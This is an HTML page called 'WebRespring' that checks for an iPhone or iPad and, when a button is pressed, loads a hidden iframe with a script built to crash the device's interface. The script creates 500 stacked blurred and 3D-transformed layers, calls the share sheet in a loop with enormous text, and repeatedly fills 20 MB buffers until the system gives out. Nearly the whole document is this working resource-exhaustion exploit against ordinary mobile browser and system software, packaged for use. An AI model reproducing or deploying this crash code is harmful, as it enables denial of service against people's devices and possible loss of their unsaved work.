<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebRespring</title>
    <style>
        :root { color-scheme: dark; }
        * { box-sizing: border-box; }
        body { min-height: 100dvh; display:grid; place-items:center; margin:0; padding:24px; background:#000; color:#fff; font-family:-apple-system, BlinkMacSystemFont, "SF Pro Text", Arial, sans-serif; text-align:center; }
        .panel { width:min(100%, 420px); }
        h1 { margin:0; font-size:28px; }
        p { color:#b8b8b8; font-size:14px; line-height:1.45; }
        button { min-height:44px; padding:0 18px; border:1px solid #fff; border-radius:10px; background:#fff; color:#000; font:600 14px inherit; cursor:pointer; }
        button:disabled { opacity:.45; cursor:not-allowed; }
        .hidden { display:none; }
        .warning { color:#ffb4a8; }
        #respring-iframe { position:fixed; top:0; left:0; width:1px; height:1px; border:none; opacity:0; pointer-events:none; }
    </style>
</head>
<body>
    <main class="panel" aria-live="polite">
        <h1>WebRespring</h1>
        <p id="status">Checking device support…</p>
        <button id="start" type="button" disabled>Start WebRespring</button>
    </main>
    <iframe id="respring-iframe" title="WebRespring engine" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>

    <script>
        (() => {
            const status = document.getElementById('status');
            const start = document.getElementById('start');
            const frame = document.getElementById('respring-iframe');
            const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent) ||
                (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);

            if (!isIOS) {
                status.textContent = 'WebRespring is only available on iPhone or iPad. No respring action was started.';
                status.className = 'warning';
                return;
            }

            status.textContent = 'Only continue on an iPhone or iPad when you intentionally want to respring.';
            start.disabled = false;
            start.addEventListener('click', () => {
                start.disabled = true;
                status.textContent = 'Starting WebRespring…';
                const respringScript = `
                    <html>
                    <body style="margin:0; overflow:hidden;">
                        <script>
                            const container = document.createElement('div');
                            container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
                            document.body.appendChild(container);
                            for (let i = 0; i < 500; i++) {
                                const d = document.createElement('div');
                                d.style.cssText = 'position:absolute; width:100vw; height:100vh; backdrop-filter:blur(100px); -webkit-backdrop-filter:blur(100px); transform:translate3d(100000px,100000px,' + i + 'px) rotateY(90deg); opacity:.99;';
                                container.appendChild(d);
                            }
                            setInterval(() => {
                                try { navigator.share({ title:'R', text:'R'.repeat(100000) }); } catch(e) {}
                                const x = new Uint8Array(1024 * 1024 * 20);
                                crypto.getRandomValues(x);
                            }, 0);
                        <\/script>
                    </body>
                    </html>
                `;
                frame.srcdoc = respringScript;
            }, { once:true });
        })();
    </script>
</body>
</html>
